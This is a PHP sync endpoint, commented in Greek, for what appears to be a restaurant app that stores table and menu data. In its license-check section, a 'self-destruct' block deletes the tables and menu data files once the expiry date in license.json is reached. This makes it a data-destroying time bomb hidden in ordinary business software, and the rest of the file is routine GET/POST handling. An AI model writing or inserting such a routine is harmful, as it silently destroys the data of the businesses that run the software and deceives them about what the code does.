<?php
clearstatcache();
header("Cache-Control: no-cache, must-revalidate");
header('Content-Type: application/json');

$tablesFile   = 'tables_data.json';
$productsFile = 'menu_data.json'; 
$licenseFile  = 'license.json'; // Το αρχείο που ορίζει τη λήξη

// --- 1. ΕΛΕΓΧΟΣ ΑΔΕΙΑΣ ΧΡΗΣΗΣ ---
$is_expired = false;
if (file_exists($licenseFile)) {
    $lic = json_decode(file_get_contents($licenseFile), true);
    // Αν η σημερινή ημερομηνία είναι μεγαλύτερη από την ημερομηνία λήξης
    if (date('Y-m-d') >= $lic['expire_date']) {
        $is_expired = true;
        
        // --- ΑΥΤΟΚΑΤΑΣΤΡΟΦΗ ---
        // Σβήνουμε τα δεδομένα για να μην μπορεί να τα κλέψει
        if (file_exists($tablesFile))   unlink($tablesFile);
        if (file_exists($productsFile)) unlink($productsFile);
    }
} else {
    // Αν κάποιος σβήσει το license.json, το πρόγραμμα κλειδώνει αυτόματα
    $is_expired = true; 
}

// --- 2. POST (SAVE) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Αν έχει λήξει η άδεια, δεν επιτρέπουμε καμία αποθήκευση
    if ($is_expired) {
        echo json_encode(["status" => "expired", "license_error" => true]);
        exit;
    }

    $input = json_decode(file_get_contents('php://input'), true);
    if ($input) {
        if (isset($input['tables'])) {
            file_put_contents($tablesFile, json_encode($input['tables']), LOCK_EX);
        }
        if (isset($input['products'])) {
            file_put_contents($productsFile, json_encode($input['products']), LOCK_EX);
        }
        echo json_encode(["status" => "ok"]);
    }
} 
// --- 3. GET (SYNC) ---
else {
    $response = [];
    $response['license_error'] = $is_expired; // Στέλνουμε το status της άδειας στο JS

    if (!$is_expired) {
        // Φόρτωση Τραπεζιών
        if (file_exists($tablesFile)) {
            $response['tables'] = json_decode(file_get_contents($tablesFile), true);
        } else {
            $response['tables'] = new stdClass();
        }

        // Φόρτωση Προϊόντων
        if (file_exists($productsFile)) {
            $menuData = json_decode(file_get_contents($productsFile), true);
            $response['products'] = $menuData;        
            $response['server_products'] = $menuData; 
        } else {
            $response['products'] = [];
            $response['server_products'] = [];
        }
    } else {
        // Αν έχει λήξει, στέλνουμε άδεια δεδομένα
        $response['tables'] = new stdClass();
        $response['products'] = [];
    }
    
    echo json_encode($response);
}
?>